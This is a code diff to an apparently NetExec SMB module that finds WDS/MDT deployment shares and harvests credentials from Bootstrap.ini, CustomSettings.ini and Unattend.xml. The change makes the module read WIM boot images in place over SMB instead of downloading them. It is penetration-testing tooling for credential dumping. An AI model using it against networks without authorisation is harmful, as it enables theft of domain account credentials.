@@ -1,16 +1,19 @@
 from base64 import b64decode
 from configparser import ConfigParser, Error as ConfigError
+from contextlib import closing
 from datetime import datetime
 from io import BytesIO
 from pathlib import Path, PureWindowsPath
-from stat import FILE_ATTRIBUTE_REPARSE_POINT, S_ISLNK
+from stat import FILE_ATTRIBUTE_REPARSE_POINT
 from xml.etree import ElementTree as ET
 
-from pybit7z import BitArchiveReader, FormatWim, lib7zip_context
+from impacket.smb3structs import FILE_READ_DATA
+from wim_nxc import WimFile
 
 from nxc.helpers.misc import CATEGORY, decode_text
 from nxc.helpers.path import sanitize_path_component
 from nxc.paths import NXC_PATH
+from nxc.protocols.smb.remotefile import RemoteFile
 
 
 class NXCModule:
@@ -19,8 +22,8 @@ class NXCModule:
 
     Inspect REMINST/REMOTEINSTALL and DeploymentShare$ for Bootstrap.ini,
     CustomSettings.ini, Unattend.xml, and candidate WinPE images.
-    Download discovered files, skipping WIM images of 1 GiB or larger by default.
-    Extract matching MDT INI and unattended XML files from WIM images.
+    Download discovered configuration files.
+    Extract matching MDT INI and unattended XML files from WIM images, read in place without downloading them.
     Report deployment secrets and store complete Windows account credentials.
 
     Module by:
@@ -32,7 +35,6 @@ class NXCModule:
     description = r"Detect PXE WDS/MDT SMB shares (REMINST\, DeploymentShare$\) and retrieve credentials from deployment files."
     supported_protocols = ["smb"]
     category = CATEGORY.CREDENTIAL_DUMPING
-    WIM_MAX_SIZE = 1024 * 1024 * 1024
 
     # https://learn.microsoft.com/en-us/intune/configmgr/mdt/support-files
     # https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-setup-automation-overview#implicit-answer-file-search-order
@@ -64,8 +66,7 @@ class NXCModule:
     }
 
     def options(self, context, module_options):
-        """IGNORE_SIZE_LIMIT     Ignore the 1 GiB WIM download limit (default: False)"""
-        self.ignore_size_limit = module_options.get("IGNORE_SIZE_LIMIT", "false").lower() == "true"
+        """No options available"""
         self.output_path = Path(NXC_PATH, "modules", "wds_mdt").resolve()
 
     def on_login(self, context, connection):
@@ -79,27 +80,20 @@ class NXCModule:
             elif share.lower() == "deploymentshare$":
                 self.explore_mdt(share)
 
-    def save_file(self, share, path, content=None):
+    def save_file(self, share, path, content):
         try:
             local_path = self.output_path / sanitize_path_component(f"{self.connection.hostname}_{self.connection.host}_{PureWindowsPath(path).stem}_{datetime.now().strftime('%Y-%m-%d_%H%M%S_%f')}{PureWindowsPath(path).suffix}")
             local_path = local_path.resolve()
             if not local_path.is_relative_to(self.output_path):
                 raise ValueError("Output path escapes the module directory")
             self.output_path.mkdir(parents=True, exist_ok=True)
-            with local_path.open("wb") as output:
-                if content is None:
-                    self.connection.conn.getFile(share, path, output.write)
-                else:
-                    output.write(content)
+            local_path.write_bytes(content)
             self.context.log.success(f"Saved {share}\\{path} to: {self.output_path}")
-            return local_path
         except Exception as e:
             self.context.log.fail(f"Failed to save {share}\\{path}: {e}")
-            return None
 
     def explore_wds(self, share):
         self.context.log.display(f"Found share: {share} (should be readable to any authenticated domain user)")
-        images = []
         for path in (r"Boot\x64\Images", r"Boot\x86\Images"):
             try:
                 entries = self.connection.conn.listPath(share, f"{path}\\*")
@@ -111,33 +105,22 @@ class NXCModule:
                 if entry.is_directory() or not entry.get_longname().lower().endswith(".wim"):
                     continue
                 self.context.log.success(f"Found WIM image: {share}\\{path}\\{entry.get_longname()} ({entry.get_filesize() / (1024 * 1024):.0f} MB)")
-                if not self.ignore_size_limit and entry.get_filesize() >= self.WIM_MAX_SIZE:
-                    self.context.log.display(f"Skipping {share}\\{path}\\{entry.get_longname()} (1 GiB WIM download limit; use IGNORE_SIZE_LIMIT=TRUE to download)")
-                    continue
-                if local_path := self.save_file(share, f"{path}\\{entry.get_longname()}"):
-                    images.append((local_path, f"{path}\\{entry.get_longname()}"))
+                self.explore_wim(share, f"{path}\\{entry.get_longname()}")
 
-        for local_path, path in images:
-            self.explore_wim(local_path, share, path)
-
-    def explore_wim(self, path, share, remote_path):
+    def explore_wim(self, share, path):
         try:
-            self.context.log.display(f"Extracting WIM: {share}\\{remote_path}")
-            # https://msclock.github.io/pybit7z/api/#pybit7z.BitInputArchive.extract_to
-            with lib7zip_context() as library:
-                archive = BitArchiveReader(library, str(path), FormatWim)
-                for index in range(archive.items_count()):
-                    entry = archive.item_at(index)
-                    if entry.is_dir() or not any(PureWindowsPath(entry.path()).match(pattern) for pattern in self.wim_patterns):
+            self.context.log.display(f"Extracting WIM: {share}\\{path}")
+            with closing(RemoteFile(self.connection.conn, path, share, access=FILE_READ_DATA)) as remote_file:
+                remote_file.open_file()
+                wim = WimFile(remote_file)
+                for entry, attributes, digest in wim.files():
+                    if attributes & FILE_ATTRIBUTE_REPARSE_POINT or not any(PureWindowsPath(entry).match(pattern) for pattern in self.wim_patterns):
                         continue
-                    if entry.attributes() & FILE_ATTRIBUTE_REPARSE_POINT or S_ISLNK(entry.attributes() >> 16):
-                        self.context.log.debug(f"Skipping WIM link: {share}\\{remote_path}!\\{entry.path()}")
-                        continue
-                    content = archive.extract_to(index)
-                    self.save_file(share, f"{remote_path}!\\{entry.path()}", content)
-                    self.parse_file(content, f"{share}\\{remote_path}!\\{entry.path()}")
+                    content = wim.read(digest)
+                    self.save_file(share, f"{path}!\\{entry}", content)
+                    self.parse_file(content, f"{share}\\{path}!\\{entry}")
         except Exception as e:
-            self.context.log.fail(f"Failed to extract WIM {share}\\{remote_path}: {e}")
+            self.context.log.fail(f"Failed to extract WIM {share}\\{path}: {e}")
 
     def explore_mdt(self, share):
         self.context.log.display(f"Found share: {share} (should require admin access)")
